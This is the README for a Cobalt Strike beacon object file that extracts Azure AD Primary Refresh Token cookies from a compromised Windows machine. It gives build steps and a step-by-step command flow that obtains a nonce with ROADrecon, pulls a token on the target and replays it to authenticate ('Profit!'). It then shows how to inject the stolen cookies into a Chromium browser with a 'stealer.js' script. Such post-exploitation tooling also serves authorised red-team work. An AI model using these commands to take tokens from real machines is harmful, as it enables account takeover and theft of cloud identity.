# aad_prt_bof

This bof allows Cobalt Strike to extract Azure AD PRT tokens from the machine.
These tokens can then be used with tools like ROADTools to extract AAD information.

## How to compile
`make` for the beacon object files

`make test` for an executable

## Usage

After compiling, load the `aadprt.cna` file into Cobalt Strike.

1. Request a nonce using ROADrecon: `roadrecon auth --prt-init`
2. Request a token on the target machine: `aadprt [NONCE]`
3. Use the token to authenticate in ROADrecon (or any other tool): `roadrecon auth --prt-cookie [TOKEN]`
4. Profit!

### Injecting Cookies into Browser
This can be done manually on a per cookie basis, or automatically via [stealer.js](https://github.com/fkasler/cuddlephish/blob/main/stealer.js) from the [Cuddlephish](https://github.com/fkasler/cuddlephish). The BOF will output a JSON blob, in the format `{"url":"https://login.microsoftonline.com","cookies":[...],"local_storage":[])`, which you can paste into a file and automatically inject into a chromium browser using 
```
node .\stealer.js .\aadprt_cookies.json
```

This requires installing [Node.js](https://nodejs.org/en/download) and stealer's dependecies
```
npm install puppeteer-extra
npm install puppeteer-extra-plugin-stealth
```

## References

Heavily inspired by the awesome work and research of [Dirk-jan](https://twitter.com/_dirkjan) and [Lee](http://twitter.com/tifkin_).

- https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/
- https://github.com/dirkjanm/ROADtoken
- https://github.com/leechristensen/RequestAADRefreshToken
- https://github.com/trustedsec/CS-Situational-Awareness-BOF
